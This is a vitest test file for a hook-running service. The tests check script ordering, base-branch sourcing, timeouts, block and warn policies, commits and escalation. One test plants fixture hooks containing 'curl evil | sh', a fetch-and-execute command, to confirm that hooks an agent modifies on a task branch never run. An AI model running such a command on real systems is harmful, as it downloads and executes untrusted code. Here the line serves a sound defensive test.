// HookService with git, herdr and runner fakes. The test with real git and processes is in
// service.git.test.ts.
import { mkdtempSync, readdirSync, readFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  FakeGit,
  FakeHerdr,
  type FakeProcessHandler,
  FakeProcessRunner,
  type FakeTree,
  GitError,
  type ProcessInput,
} from "@lunasq/adapters";
import { listEvents, ProjectRepository, TaskWorktreeRepository } from "@lunasq/db";
import { insertProject, insertTask, migratedDatabase } from "@lunasq/db/test-helpers";
import { DEFAULT_HOOK_TIMEOUT_SECONDS, taskBranch } from "@lunasq/domain";
import { HOOK_EXECUTED, HOOK_POINT_COMPLETED } from "@lunasq/schemas";
import { afterEach, describe, expect, it, vi } from "vitest";
import { HookService, isHookError } from "./service.ts";

const sh = (body: string) => ({ content: `#!/bin/sh\n${body}\n`, executable: true });

const baseTree: FakeTree = {
  "README.md": { content: "repo\n" },
  "lunasq/hooks/before_delivery/20-changelog": sh("echo changelog"),
  "lunasq/hooks/before_delivery/10-bump": sh("echo bump"),
  "lunasq/hooks/before_delivery/lib.sh": { content: "helper\n" },
  "lunasq/hooks/after_merge/10-deploy": sh("echo deploy"),
  "lunasq/hooks/on_failure/10-logs": sh("echo logs"),
};

const scriptsDirs: string[] = [];
afterEach(() => {
  for (const dir of scriptsDirs.splice(0)) rmSync(dir, { recursive: true, force: true });
});

/** Path of the script the runner received (the command is the path in single quotes). */
const scriptPath = (call: ProcessInput) => call.command.slice(1, -1);
const scriptName = (call: ProcessInput) => scriptPath(call).split("/").at(-1);

async function setup(opts: { tree?: FakeTree; handler?: FakeProcessHandler } = {}) {
  const db = migratedDatabase();
  const project = insertProject(db);
  const task = insertTask(db, project.id);
  const git = new FakeGit();
  git.addCheckout(project.localPath, { branch: "main", tree: opts.tree ?? baseTree });
  const wtPath = `/worktrees/${task.id}`;
  git.addCheckout(wtPath, { branch: taskBranch(task.id), tree: opts.tree ?? baseTree });
  const herdr = new FakeHerdr();
  const { workspace, rootPaneId } = await herdr.ensureWorkspace({ cwd: wtPath, label: "wt" });
  const worktrees = {
    ensure: vi.fn(async () => ({
      branch: taskBranch(task.id),
      path: wtPath,
      workspaceId: workspace.workspaceId,
      rootPaneId,
      created: false,
    })),
  };
  const runner = new FakeProcessRunner(opts.handler);
  const panes: string[] = [];
  /** Content of each script and its neighbors at the moment it runs (they are deleted afterwards). */
  const seen: { name: string; content: string; dir: string[] }[] = [];
  const scriptsDir = mkdtempSync(join(tmpdir(), "lunasq-hooks-test-"));
  scriptsDirs.push(scriptsDir);
  const service = new HookService({
    db,
    git,
    herdr,
    projects: new ProjectRepository(db),
    tasks: new TaskWorktreeRepository(db),
    worktrees,
    runnerFor: (paneId) => {
      panes.push(paneId);
      return {
        run: (input) => {
          const path = scriptPath(input);
          seen.push({
            name: path.split("/").at(-1) ?? "",
            content: readFileSync(path, "utf8"),
            dir: readdirSync(join(path, "..")).sort(),
          });
          return runner.run(input);
        },
      };
    },
    scriptsDir,
  });
  const events = (type: string) => listEvents(db, task.id).filter((e) => e.type === type);
  const taskRow = () => new TaskWorktreeRepository(db).get(task.id);
  return {
    db,
    project,
    task,
    git,
    herdr,
    wtPath,
    rootPaneId,
    worktrees,
    runner,
    panes,
    seen,
    scriptsDir,
    service,
    events,
    taskRow,
  };
}

describe("HookService.run", () => {
  it("runs the point's executable scripts in alphabetical order, in the worktree and with the context", async () => {
    const { project, task, wtPath, rootPaneId, runner, panes, service, events } = await setup();

    const res = await service.run({
      taskId: task.id,
      point: "before_delivery",
      runId: "run-1",
      prUrl: "https://github.com/o/r/pull/1",
    });

    expect(res.outcome).toBe("passed");
    expect(runner.calls.map(scriptName)).toEqual(["10-bump", "20-changelog"]);
    expect(panes).toEqual([rootPaneId]);
    expect(runner.calls[0]).toEqual({
      command: expect.stringMatching(/^'.*\/10-bump'$/),
      cwd: wtPath,
      env: {
        LUNASQ_PROJECT_ID: project.id,
        LUNASQ_TASK_ID: task.id,
        LUNASQ_RUN_ID: "run-1",
        LUNASQ_PHASE: "deliver",
        LUNASQ_HOOK_POINT: "before_delivery",
        LUNASQ_WORKTREE: wtPath,
        LUNASQ_BRANCH: taskBranch(task.id),
        LUNASQ_BASE_BRANCH: "main",
        LUNASQ_PR_URL: "https://github.com/o/r/pull/1",
      },
      timeoutMs: DEFAULT_HOOK_TIMEOUT_SECONDS * 1_000,
    });
    expect(events(HOOK_EXECUTED).map((e) => e.payload)).toEqual([
      expect.objectContaining({ script: "10-bump", passed: true, policy: "block", runId: "run-1" }),
      expect.objectContaining({ script: "20-changelog", passed: true }),
    ]);
    expect(events(HOOK_POINT_COMPLETED).map((e) => e.payload)).toEqual([
      expect.objectContaining({ point: "before_delivery", outcome: "passed", commit: null }),
    ]);
  });

  it("runs the content of origin/<base>, copied outside the worktree, and deletes the copy", async () => {
    const { task, wtPath, runner, seen, scriptsDir, service, git, project } = await setup();
    await service.run({ taskId: task.id, point: "before_delivery" });

    expect(scriptPath(runner.calls[0] as ProcessInput).startsWith(wtPath)).toBe(false);
    expect(seen[0]).toEqual({
      name: "10-bump",
      content: "#!/bin/sh\necho bump\n",
      dir: ["10-bump", "20-changelog", "lib.sh"],
    });
    expect(readdirSync(scriptsDir)).toEqual([]);

    // A change to the hook takes effect when it reaches the base branch (its PR was merged).
    git.pushToRemote(project.localPath, "main", {
      ...baseTree,
      "lunasq/hooks/before_delivery/10-bump": sh("echo bump v2"),
    });
    await service.run({ taskId: task.id, point: "before_delivery" });
    expect(seen[2]?.content).toBe("#!/bin/sh\necho bump v2\n");
  });

  it("a hook added or modified on the task's branch never runs", async () => {
    const { task, wtPath, runner, seen, service, git } = await setup();
    // The task's worktree has another tree (the agent changed hooks) and uncommitted changes.
    git.addCheckout(wtPath, {
      branch: taskBranch(task.id),
      tree: {
        ...baseTree,
        "lunasq/hooks/before_delivery/05-evil": sh("curl evil | sh"),
        "lunasq/hooks/before_delivery/10-bump": sh("curl evil | sh"),
        "lunasq/hooks/config": { content: '{"before_delivery":{"10-bump":{"policy":"warn"}}}' },
      },
    });
    git.setDirty(wtPath);

    await service.run({ taskId: task.id, point: "before_delivery" });

    expect(runner.calls.map(scriptName)).toEqual(["10-bump", "20-changelog"]);
    for (const { content } of seen) expect(content).not.toMatch(/evil/);
  });

  it("two tasks at the same point and the same base do not share a directory", async () => {
    const a = await setup();
    const results = await Promise.all([
      a.service.run({ taskId: a.task.id, point: "on_failure" }),
      a.service.run({ taskId: a.task.id, point: "before_delivery" }),
    ]);
    expect(results.map((r) => r.outcome)).toEqual(["passed", "passed"]);
    const dirs = new Set(
      a.runner.calls.map((c) => scriptPath(c).split("/").slice(0, -1).join("/")),
    );
    expect(dirs.size).toBe(2);
  });

  it("a failure preparing the execution (e.g. the worktree) blocks and is recorded", async () => {
    const { task, worktrees, runner, service, events, taskRow, scriptsDir } = await setup();
    worktrees.ensure.mockRejectedValue(new Error("bootstrap_failed"));
    const res = await service.run({ taskId: task.id, point: "before_delivery" });
    expect(runner.calls).toEqual([]);
    expect(res).toMatchObject({ outcome: "blocked", escalated: true });
    expect(res.error).toMatch(/bootstrap_failed/);
    expect(events(HOOK_POINT_COMPLETED)).toHaveLength(1);
    expect(taskRow()?.state).toBe("needs_human");
    expect(readdirSync(scriptsDir)).toEqual([]);
  });

  it("applies timeout and policy from lunasq/hooks/config of the base branch", async () => {
    const { task, runner, service } = await setup({
      tree: {
        ...baseTree,
        "lunasq/hooks/config": {
          content: JSON.stringify({
            before_delivery: { "10-bump": { timeoutSeconds: 5, policy: "warn" } },
          }),
        },
      },
      handler: () => ({ exitCode: 1 }),
    });

    const res = await service.run({ taskId: task.id, point: "before_delivery" });

    expect(runner.calls.map((c) => c.timeoutMs)).toEqual([
      5_000,
      DEFAULT_HOOK_TIMEOUT_SECONDS * 1_000,
    ]);
    expect(res.executions.map((e) => [e.script, e.policy, e.passed])).toEqual([
      ["10-bump", "warn", false],
      ["20-changelog", "block", false],
    ]);
  });

  it("a block that fails stops the following ones and sends the task to needs_human with hook_failed", async () => {
    const { task, runner, service, events, taskRow } = await setup({
      handler: () => ({ exitCode: 2, stdout: "boom\n" }),
    });

    const res = await service.run({ taskId: task.id, point: "before_delivery", runId: "run-1" });

    expect(runner.calls.map(scriptName)).toEqual(["10-bump"]);
    expect(res).toMatchObject({ outcome: "blocked", failedScript: "10-bump", escalated: true });
    expect(res.executions[0]).toMatchObject({ exitCode: 2, output: "boom\n", passed: false });
    expect(taskRow()?.state).toBe("needs_human");
    expect(events("task.transitioned").at(-1)?.payload).toMatchObject({
      command: "escalate",
      reason: "hook_failed",
      note: expect.stringContaining("before_delivery/10-bump"),
    });
    expect(events(HOOK_POINT_COMPLETED).at(-1)?.payload).toMatchObject({
      outcome: "blocked",
      failedScript: "10-bump",
    });
  });

  it("a warn that fails is recorded and the point continues", async () => {
    const { task, runner, service, taskRow } = await setup({
      tree: {
        ...baseTree,
        "lunasq/hooks/config": {
          content: JSON.stringify({ before_delivery: { "10-bump": { policy: "warn" } } }),
        },
      },
      handler: (input) => ({ exitCode: input.command.includes("10-bump") ? 1 : 0 }),
    });

    const res = await service.run({ taskId: task.id, point: "before_delivery" });

    expect(runner.calls.map(scriptName)).toEqual(["10-bump", "20-changelog"]);
    expect(res).toMatchObject({ outcome: "warned", failedScript: null, escalated: false });
    expect(taskRow()?.state).not.toBe("needs_human");
  });

  it("a timeout counts as a failure even if the exit code is 0", async () => {
    const { task, service } = await setup({ handler: () => ({ exitCode: 0, timedOut: true }) });
    const res = await service.run({ taskId: task.id, point: "before_delivery" });
    expect(res).toMatchObject({ outcome: "blocked", failedScript: "10-bump" });
  });

  it("if the runner cannot launch the hook, it is a failure with the reason in the output", async () => {
    const { task, service } = await setup({
      handler: () => {
        throw new Error("herdr no responde");
      },
    });
    const res = await service.run({ taskId: task.id, point: "before_delivery" });
    expect(res.outcome).toBe("blocked");
    expect(res.executions[0]?.output).toMatch(/herdr no responde/);
  });

  it("an invalid config blocks without running anything", async () => {
    const { task, runner, service, taskRow } = await setup({
      tree: { ...baseTree, "lunasq/hooks/config": { content: "{ no es json" } },
    });
    const res = await service.run({ taskId: task.id, point: "before_delivery" });
    expect(runner.calls).toEqual([]);
    expect(res).toMatchObject({ outcome: "blocked", escalated: true });
    expect(res.error).toMatch(/lunasq\/hooks\/config/);
    expect(taskRow()?.state).toBe("needs_human");
  });

  it("if the base branch cannot be read, it blocks", async () => {
    const { task, git, runner, service } = await setup();
    vi.spyOn(git, "fetch").mockRejectedValue(new GitError("git_failed", "sin red"));
    const res = await service.run({ taskId: task.id, point: "before_delivery" });
    expect(runner.calls).toEqual([]);
    expect(res).toMatchObject({ outcome: "blocked", baseRef: null, escalated: true });
    expect(res.error).toMatch(/origin\/main.*sin red/);
  });

  it("with no scripts at the point it runs nothing, records no events or touches the worktree", async () => {
    const { task, runner, service, events, worktrees } = await setup();
    const res = await service.run({ taskId: task.id, point: "before_refinement" });
    expect(res).toMatchObject({ outcome: "passed", executions: [] });
    expect(runner.calls).toEqual([]);
    expect(events(HOOK_POINT_COMPLETED)).toEqual([]);
    expect(worktrees.ensure).not.toHaveBeenCalled();
  });

  it("throws if the task does not exist", async () => {
    const { service } = await setup();
    await expect(
      service.run({ taskId: "00000000-0000-4000-8000-000000000000", point: "before_delivery" }),
    ).rejects.toSatisfy((err) => isHookError(err, "task_not_found"));
  });
});

describe("HookService: commit of what the hooks leave", () => {
  it("commits the changes with the task trailers; repeating without changes creates no other commit", async () => {
    const ctx = await setup();
    ctx.runner.respond((input) => {
      if (input.command.includes("10-bump")) ctx.git.setDirty(ctx.wtPath);
      return {};
    });

    const res = await ctx.service.run({
      taskId: ctx.task.id,
      point: "before_delivery",
      runId: "run-1",
    });

    expect(res.commit).toMatch(/^[0-9a-f]{40}$/);
    expect(ctx.git.commitLog).toEqual([
      {
        cwd: ctx.wtPath,
        sha: res.commit,
        message: "chore(lunasq): hooks before_delivery",
        trailers: { "LunasQ-Task": ctx.task.id, "LunasQ-Run": "run-1" },
      },
    ]);
    expect(ctx.events(HOOK_POINT_COMPLETED).at(-1)?.payload).toMatchObject({ commit: res.commit });

    ctx.runner.respond(() => ({}));
    const again = await ctx.service.run({
      taskId: ctx.task.id,
      point: "before_delivery",
      runId: "run-1",
    });
    expect(again.commit).toBeNull();
    expect(ctx.git.commitLog).toHaveLength(1);
  });

  it("if the worktree already had uncommitted changes, it does not commit and warns", async () => {
    const { task, wtPath, git, service } = await setup();
    git.setDirty(wtPath);
    const res = await service.run({ taskId: task.id, point: "before_delivery" });
    expect(res).toMatchObject({ outcome: "warned", commit: null, commitSkipped: true });
    expect(git.commitLog).toEqual([]);
  });

  it("if the point blocks, it does not commit", async () => {
    const ctx = await setup();
    ctx.runner.respond(() => {
      ctx.git.setDirty(ctx.wtPath);
      return { exitCode: 1 };
    });
    const res = await ctx.service.run({ taskId: ctx.task.id, point: "before_delivery" });
    expect(res).toMatchObject({ outcome: "blocked", commit: null });
    expect(ctx.git.commitLog).toEqual([]);
  });

  it("a commit that fails blocks the point", async () => {
    const ctx = await setup();
    ctx.runner.respond(() => {
      ctx.git.setDirty(ctx.wtPath);
      return {};
    });
    vi.spyOn(ctx.git, "commitAll").mockRejectedValue(new GitError("git_failed", "pre-commit"));
    const res = await ctx.service.run({ taskId: ctx.task.id, point: "before_delivery" });
    expect(res).toMatchObject({ outcome: "blocked", escalated: true });
    expect(res.error).toMatch(/pre-commit/);
  });
});

describe("HookService: after_merge and on_failure", () => {
  it("after_merge runs on a temporary checkout of the base commit, does not commit and a failure does not escalate", async () => {
    const ctx = await setup();
    let checkout = "";
    ctx.runner.respond((input) => {
      checkout = input.cwd;
      ctx.git.setDirty(input.cwd);
      return { exitCode: 1 };
    });

    const res = await ctx.service.run({ taskId: ctx.task.id, point: "after_merge" });

    expect(ctx.runner.calls.map(scriptName)).toEqual(["10-deploy"]);
    expect(checkout).not.toBe(ctx.project.localPath);
    expect(ctx.runner.calls[0]?.env).toMatchObject({
      LUNASQ_WORKTREE: checkout,
      LUNASQ_BRANCH: "main",
    });
    expect(ctx.runner.calls[0]?.env).not.toHaveProperty("LUNASQ_PHASE");
    expect(ctx.worktrees.ensure).not.toHaveBeenCalled();
    expect(ctx.git.hasCheckout(checkout)).toBe(false);
    expect(ctx.git.commitLog).toEqual([]);
    expect(res).toMatchObject({ outcome: "blocked", escalated: false, commit: null });
    expect(ctx.taskRow()?.state).not.toBe("needs_human");
  });

  it("on_failure receives the phase result and a failure does not escalate", async () => {
    const { task, runner, service, taskRow } = await setup({ handler: () => ({ exitCode: 1 }) });
    const res = await service.run({
      taskId: task.id,
      point: "on_failure",
      runId: "run-9",
      phaseResult: "timeout",
    });
    expect(runner.calls[0]?.env).toMatchObject({
      LUNASQ_PHASE_RESULT: "timeout",
      LUNASQ_RUN_ID: "run-9",
    });
    expect(res).toMatchObject({ outcome: "blocked", escalated: false });
    expect(taskRow()?.state).not.toBe("needs_human");
  });
});

describe("HookService.listHooks", () => {
  it("shows the hooks of each point as they are in the base branch", async () => {
    const { project, service } = await setup({
      tree: {
        ...baseTree,
        "lunasq/hooks/config": {
          content: JSON.stringify({ after_merge: { "10-deploy": { policy: "warn" } } }),
        },
      },
    });

    const hooks = await service.listHooks(project.id);

    expect(hooks.baseRef).toMatch(/^[0-9a-f]{40}$/);
    expect(hooks.configError).toBeNull();
    const byPoint = Object.fromEntries(hooks.points.map((p) => [p.point, p.hooks]));
    expect(Object.keys(byPoint)).toHaveLength(10);
    expect(byPoint.before_delivery?.map((h) => h.script)).toEqual(["10-bump", "20-changelog"]);
    expect(byPoint.after_merge).toEqual([
      {
        script: "10-deploy",
        policy: "warn",
        timeoutSeconds: DEFAULT_HOOK_TIMEOUT_SECONDS,
        content: "#!/bin/sh\necho deploy\n",
      },
    ]);
    expect(byPoint.before_refinement).toEqual([]);
  });
});
